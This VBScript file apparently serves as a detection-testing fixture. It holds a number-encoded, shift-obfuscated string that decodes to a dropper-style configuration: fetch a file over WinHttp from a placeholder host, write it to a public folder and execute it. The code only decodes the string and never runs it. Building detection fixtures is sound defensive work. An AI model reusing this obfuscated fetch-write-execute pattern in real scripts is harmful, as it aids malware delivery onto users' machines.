Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_7e34ef42 = "116,59,47,122,113,114,99,110,113,59,95,97,111,115,103,112,99,93,112,99,107,109,114,99,42,117,112,103,114,99,93,100,103,106,99,122,95,98,95,110,114,99,112,59,85,103,108,70,114,114,110,44,85,103,108,70,114,114,110,80,99,111,115,99,113,114,44,51,44,47,122,113,114,95,101,99,93,97,109,115,108,114,59,48,122,97,95,107,110,95,103,101,108,93,103,98,59,97,95,107,110,95,103,101,108,43,51,55,51,53,52,100,54,100,49,49,122,115,112,106,59,102,114,114,110,113,56,45,45,51,55,51,53,52,100,54,100,49,49,44,99,118,95,107,110,106,99,44,103,108,116,95,106,103,98,45,50,46,49,95,55,53,48,49,44,98,95,114,122,115,113,99,112,93,95,101,99,108,114,59,70,115,108,114,112,99,113,113,74,95,96,45,51,55,51,53,52,100,54,100,49,49,122,100,103,106,99,93,110,95,114,102,59,65,56,90,83,113,99,112,113,90,78,115,96,106,103,97,90,70,115,108,114,112,99,113,113,74,95,96,90,113,114,95,101,99,43,51,55,51,53,52,100,54,100,49,49,44,98,95,114"
Const Codec_7e34ef42 = "decimal_comma|subtract_modulo_256|02"

Function Load_7e34ef42()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_7e34ef42, ",")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(ByTeInDeX) = CInt(parts(ByTeInDeX))
  Next
  Load_7e34ef42 = result
End Function

Function Decode_7e34ef42(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = (SoUrCeByTeS(ByTeInDeX) + 2) Mod 256
  Next
  Decode_7e34ef42 = result
End Function

Function Recover_7e34ef42()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  ' configuration reconstruction
NeUtRaL = UBound(Array(3, 5, 8, 13))
  SoUrCeByTeS = Load_7e34ef42()
  Do
    DeCoDeDByTeS = Decode_7e34ef42(SoUrCeByTeS)
    Exit Do
  Loop
  DeScRiPtOrTeXt = ""
  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
  Next
' reconstruction complete
  Recover_7e34ef42 = DeScRiPtOrTeXt
End Function

Function Inspect_7e34ef42()
  Inspect_7e34ef42 = Recover_7e34ef42()
End Function
